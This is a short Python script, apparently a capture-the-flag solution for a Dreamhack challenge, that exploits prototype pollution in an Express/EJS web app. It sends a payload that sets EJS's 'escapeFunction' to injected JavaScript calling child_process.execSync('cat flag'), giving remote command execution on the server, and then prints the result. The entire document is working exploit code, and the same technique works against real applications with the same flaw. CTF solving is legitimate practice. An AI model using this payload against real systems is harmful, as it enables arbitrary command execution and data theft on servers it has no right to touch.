import requests

url = "http://host3.dreamhack.games:14640/"
s = requests.Session()

fn = "1;return process.mainModule.require('child_process').execSync('cat flag');"
payload = '","__proto__": {"settings": {"view options": {"client": true, "escapeFunction": "%s"}}}, "a":"' % fn

res = s.get(f'{url}/raw/{payload}')

res = s.get(url)
print(res.text)